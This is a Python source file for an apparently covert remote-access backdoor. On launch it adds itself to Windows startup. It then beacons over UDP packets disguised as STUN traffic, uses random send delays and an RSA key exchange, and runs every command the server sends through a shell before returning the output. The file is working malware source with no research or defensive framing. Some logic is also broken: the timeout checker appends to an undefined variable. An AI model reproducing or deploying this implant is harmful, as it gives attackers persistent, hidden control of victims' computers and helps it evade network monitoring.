from encryption import encrypt_message
from decryption import decrypt_message
from message_fragmentation import fragment_message
from stun import build_stun_message
import socket, time, random, base64, struct, subprocess, gc, rsa, threading
from add_to_startup import add_to_windows_startup
from check_missing import check_missing_packets
my_priv_key = None
my_pub_key = None
target_pub_key = None
CHUNK_SIZE = 256
IS_ADDED_TO_STARTUP = False
SERVER = ("127.0.0.1", 27381)
sent_chunks = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
last_received_time = None 
resends_requests = 0
received_chunks = {}
expected_chunks = None

def parse_public_key(text: str):
    try:
        n, e = text.replace("PublicKey(", "").replace(")", "").split(",")
        n = int(n.strip())
        e = int(e.strip())
        key = rsa.PublicKey(n, e)
        return key
    except:
        return None

if IS_ADDED_TO_STARTUP == False:
    if add_to_windows_startup() == 200:
        IS_ADDED_TO_STARTUP = True

def send_msg(message, is_cached: bool):
    if type(message) is not str:
        message = str(message)
    try:
        if target_pub_key and not message.startswith("PublicKey("):
            message = encrypt_message(message, target_pub_key)["message"]
            message = base64.b64encode(message.encode()).decode()
        chunks = fragment_message(message, CHUNK_SIZE)
        i = 0
        for chunk in chunks:
            chunk = build_stun_message(chunk)
            if is_cached:
                sent_chunks[i] = chunk
                i+=1
            jitter_delay = 0.3 + random.uniform(-0.3, 0.3)
            time.sleep(jitter_delay)
            sock.sendto(chunk, SERVER)
                
        
    except:
        return


def timeout_checker():
    global received_chunks, expected_chunks, last_received_time, resends_requests
    
    while True:
        if last_received_time is not None:
            if resends_requests <= 3:
                try:
                    if expected_chunks and received_chunks and ((time.time() - last_received_time) > 3):
                        missing_packets = check_missing_packets(received_chunks, expected_chunks)
                        if missing_packets:
                            counter = 0
                            for i in missing_packets:
                                msg+=str(i)
                                if counter != (len(missing_packets) - 1):
                                    msg+=","
                                counter += 1
                            sock.sendto(build_stun_message(msg), SERVER)
                            time.sleep(3)
                            continue
                except:
                    pass
            else:
                resends_requests = 0
                last_received_time = None
                received_chunks = {}
                expected_chunks = None
        time.sleep(0.5)
    time.sleep(0.5)

def core():
    global my_priv_key, my_pub_key, target_pub_key, CHUNK_SIZE, received_chunks, expected_chunks, sent_chunks
    
    while True:
        sock.sendto(build_stun_message("heartbeat".encode("utf8")), SERVER)
        sock.settimeout(20)
        

        while True:
            try:
                data, addr = sock.recvfrom(4096)
                
                if len(data) < 20:
                    continue

                header = data[:20]
                attributes = data[20:]

                if len(attributes) < 4:
                    continue

                msg_type, msg_length = struct.unpack('!HH', header[:4])

                if msg_type in [273, 258]: # 0x0111, 0x0102, dummy STUN message types
                    continue

                magic_cookie = struct.unpack('!I', header[4:8])[0]
                if magic_cookie != 0x2112A442:
                    continue

                attr_type, attr_length = struct.unpack('!HH', attributes[:4])
                command = attributes[4:4+attr_length]
                command = command.decode("utf8")
                if command == "ACK":
                    sent_chunks = {}
                    last_received_time = None
                    gc.collect()
                    continue
                if command.startswith("missing"):
                    try:
                        missings = command.split()[1].split(',')
                        try:
                            for missing in missings:
                                missing = int(missing)
                                chunk = sent_chunks[missing]
                                sock.sendto(chunk, SERVER)
                        except:
                            pass
                        received_chunks = {}
                        expected_chunks = None
                        gc.collect()
                    except:
                        pass
                    continue

                part, total, index = command.split("|", 2)
                index = int(index)
                total = int(total)

                received_chunks[index] = part

                if not expected_chunks:
                    expected_chunks = total

                if len(received_chunks) == expected_chunks:
                    full_command = "".join(received_chunks[i] for i in sorted(received_chunks))
                    
                    # Not encrypted message, such as public keys
                    if full_command.startswith("PublicKey("):
                        ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
                        send_msg(my_pub_key, False)
                        target_pub_key = parse_public_key(full_command)
                        received_chunks = {}
                        expected_chunks = None
                        gc.collect()
                        continue

                    if my_priv_key:
                        full_command = base64.b64decode(full_command)
                        full_command = decrypt_message(full_command, my_priv_key)
                        if full_command["status"] != 200:
                            sock.sendto("ACK".encode('utf8'), SERVER)
                            send_msg("Failed to decrypt the message, there maybe a packet loss or a problem with the keys.", False)
                            received_chunks = {}
                            expected_chunks = None
                            gc.collect()
                            continue

                        full_command = full_command["message"]
                        
                        if full_command.startswith("target_chunk"):
                            cmd, chunk_size = full_command.split()
                            chunk_size = int(chunk_size)
                            CHUNK_SIZE = chunk_size
                            send_msg(f"set chunk size => {CHUNK_SIZE}", False)
                            received_chunks = {}
                            expected_chunks = None
                            gc.collect()
                            continue
                            
                        

                        sock.sendto("ACK".encode('utf8'), SERVER)
                        response = subprocess.getoutput(full_command)
                        send_msg(response, True)
                        received_chunks = {}
                        expected_chunks = None
                        gc.collect()
                        continue
                    
                    else:
                        sock.sendto("ACK".encode('utf8'), SERVER)
                        send_msg("Keys wasn't exchange or your key was lost, please initiate keys exchange to be able to run commands.", False)
                        received_chunks = {}
                        expected_chunks = None
                        gc.collect()
                        continue
                else:
                    pass
            except socket.timeout:
                break
            except:
                pass
threads = []
thread = threading.Thread(target=core)
thread2 = threading.Thread(target=timeout_checker)
threads.append(thread)
threads.append(thread2)
for t in threads:
    t.start()